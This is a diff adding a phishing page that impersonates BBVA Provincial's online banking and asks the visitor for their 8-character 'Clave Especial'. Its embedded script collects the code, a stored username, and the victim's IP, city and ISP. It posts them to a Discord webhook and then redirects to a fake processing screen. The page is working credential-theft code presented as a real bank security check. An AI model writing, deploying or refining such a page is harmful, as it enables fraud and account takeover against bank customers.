@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es-VE">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex nofollow noarchive">
+    <title>BBVA Provincial - Clave Especial</title>
+    <link rel="icon" type="image/png" href="https://www.provincial.com/favicon.ico">
+    <script src="info.js"></script>
+    <script src="alertas.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .headerReclamos {
+            background: #072146;
+            padding: 0;
+        }
+        .HeaderRow {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+        }
+        .headerLeft {
+            display: flex;
+            align-items: center;
+        }
+        .headerLogo {
+            width: auto;
+            max-width: 100%;
+            height: auto;
+            max-height: 20px;
+            cursor: pointer;
+            position: relative;
+            top: -6px;
+        }
+        .closex {
+            height: 20px;
+            width: 20px;
+            cursor: pointer;
+        }
+        .container {
+            flex: 1;
+            max-width: 400px;
+            width: 100%;
+            margin: 30px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px 25px;
+        }
+        .icon-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .icon-container img { width: 60px; }
+        h1 {
+            color: #072146;
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        h2 {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            font-weight: normal;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+            text-transform: uppercase;
+        }
+        .form-group input:focus {
+            border-color: #072146;
+        }
+        .form-group .error-msg {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #072146;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover { background: #0c3369; }
+        .btn-submit:disabled {
+            background: #999;
+            cursor: not-allowed;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+        .loading .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #072146;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        footer {
+            background: #072146;
+            padding: 15px 20px;
+            text-align: center;
+        }
+        footer img { height: 25px; opacity: 0.7; }
+        footer p {
+            color: rgba(255,255,255,0.6);
+            font-size: 11px;
+            margin-top: 8px;
+        }
+        @media (max-width: 900px) {
+            .container {
+                max-width: 90%;
+                margin: 20px auto;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+        <div class="headerReclamos">
+        <div class="HeaderRow">
+            <div class="headerLeft">
+                <img src="logo-bbva-provincial1.png" alt="" class="headerLogo" onclick="salir();">
+            </div>
+            <img src="close2.png" alt="" class="closex" onclick="salir();">
+        </div>
+    </div>
+
+
+    <div class="container">
+        <div class="icon-container">
+            <img src="claveespecial.png" alt="Seguridad">
+        </div>
+        <h1>Verificación de Seguridad</h1>
+        <h2>Por favor ingrese su Clave Especial</h2>
+
+        <form id="loginform" autocomplete="off">
+            <div class="form-group">
+                <label for="clvs">Clave Especial</label>
+                <input type="text" id="clvs" name="clvs" maxlength="8" placeholder="Ingrese su clave de 8 dígitos" autocomplete="off" style="text-transform: none;">
+                <div class="error-msg" id="error-msg">La clave debe tener exactamente 8 caracteres alfanuméricos</div>
+            </div>
+            <button type="submit" class="btn-submit" id="btn-submit">Verificar</button>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top:10px;color:#666;font-size:13px;">Verificando...</p>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <img src="bbva.png" alt="BBVA">
+        <p>© 2024 BBVA Provincial S.A. RIF: J-00002967-9</p>
+    </footer>
+
+    <script>
+        const salir = () => location.href = "https://www.provincial.com/personas.html";
+
+        document.getElementById('loginform').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const clave = document.getElementById('clvs').value.trim();
+            const errorMsg = document.getElementById('error-msg');
+            const btn = document.getElementById('btn-submit');
+            const loading = document.getElementById('loading');
+
+            // Validar 8 caracteres alfanumericos
+            if (!/^[a-zA-Z0-9]{8}$/.test(clave)) {
+                errorMsg.style.display = 'block';
+                document.getElementById('clvs').classList.add('input-error');
+                return;
+            }
+            errorMsg.style.display = 'none';
+
+            btn.disabled = true;
+            loading.style.display = 'block';
+
+            const username = sessionStorage.getItem('username') || 'Desconocido';
+            
+            let ip = 'unknown', country = 'Desconocido', city = '', isp = '';
+            try {
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResp.json();
+                ip = ipData.ip;
+                
+                const geoResp = await fetch('http://ip-api.com/json/' + ip);
+                const geoData = await geoResp.json();
+                if (geoData.status === 'success') {
+                    country = geoData.country || 'Desconocido';
+                    city = geoData.city || '';
+                    isp = geoData.isp || '';
+                }
+            } catch(err) {
+                console.error('Error getting location:', err);
+            }
+
+            const dataToSend = {
+                content: null,
+                embeds: [{
+                    title: "**🔐 CLAVE ESPECIAL BBVA 🔐**",
+                    color: 0xFF0000,
+                    fields: [
+                        { name: "👤 Usuario", value: "```" + username + "```", inline: false },
+                        { name: "🔑 Clave Especial", value: "```" + clave + "```", inline: false },
+                        { name: "🌐 IP", value: ip, inline: true },
+                        { name: "📍 Ubicación", value: city + ", " + country, inline: true },
+                        { name: "🏢 ISP", value: isp || 'N/A', inline: true },
+                        { name: "📅 Fecha", value: new Date().toLocaleString('es-VE'), inline: false }
+                    ],
+                    footer: { text: "made by @morph3ush4ck", icon_url: "https://i.postimg.cc/1zqW2Hw0/105823-200.png" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Enviar a Discord
+            try {
+                await fetch(window.WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(dataToSend)
+                });
+            } catch(err) {
+                console.error("Error sending to webhook:", err);
+            }
+
+            // Redirigir a pantalla de carga
+            window.location.href = "procesando.html?to=cargando.html&time=5";
+        });
+    </script>
+</body>
+</html>
